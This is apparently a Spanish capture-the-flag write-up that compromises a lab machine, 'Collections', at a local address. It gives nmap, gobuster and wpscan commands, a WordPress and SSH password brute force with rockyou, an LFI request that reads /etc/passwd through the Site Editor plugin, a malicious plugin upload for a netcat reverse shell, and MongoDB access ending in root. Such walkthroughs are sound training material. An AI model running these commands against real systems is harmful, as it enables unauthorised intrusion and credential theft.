# Maquina Collections

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.1 

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,27017 -vvv -Pn 172.17.0.1

![alt text](image-1.png)

### Fuzzing Web

gobuster dir -t 200 -u http://172.17.0.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

![alt text](image-2.png)

gobuster dir -t 200 -u http://172.17.0.1/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

![alt text](image-3.png)

utilizamos wpscan para ver si hay algún usuario


wpscan --url http://172.17.0.1/wordpress -e p,u

![alt text](image-4.png)

hacemos fuerza bruta con wpscan:

wpscan -U chocolate -P /usr/share/wordlists/rockyou.txt --url http://172.17.0.1/wordpress/wp-login.php -t 200 --multicall-max-passwords 2000

![alt text](image-5.png)

aplicamos un 

curl -s -X GET "http://172.17.0.1/wordpress/" | grep plugins

![alt text](image-6.png)

el site  editor 1.1 tiene una vulnerabilidad de LFI:

iniciamos sesión, y luego nos vamos a la ruta: 

http://collections.dl/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

![alt text](image-7.png)

### Ataque con hydra:

hydra -l chocolate -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.1 -t 4 -I

![alt text](image-8.png)

### Intrusión

Forma 1:

Nos conectamos por ssh

ssh chocolate@172.17.0.1

![alt text](image-9.png)

hice un cat /etc/passwd | grep bash

![alt text](image-10.png)

Forma 2:

Una vez iniciado sesión subimos un plugin con código mailicioso:

![alt text](image-13.png)

lo comprimimos con zip y los subimos, luego lo instalamos y lo activamos, nos ponemos en escucha con netcat y listo tenemos acceso, hacemos tratamiento de la tty:

![alt text](image-14.png)

luego seguimos la misma forma de escalar privilegios.

### Escalar privilegios

como tenemos corriendo mongo en el puerto 27017, nos conectamos :

mongo --host 172.17.0.1 --port 27017

![alt text](image-11.png)

luego volvemos a la conexión ssh, y ejecutamos su root y escribimos la contraseña chocolaterequetebueno123

![alt text](image-12.png)

soy root !!!

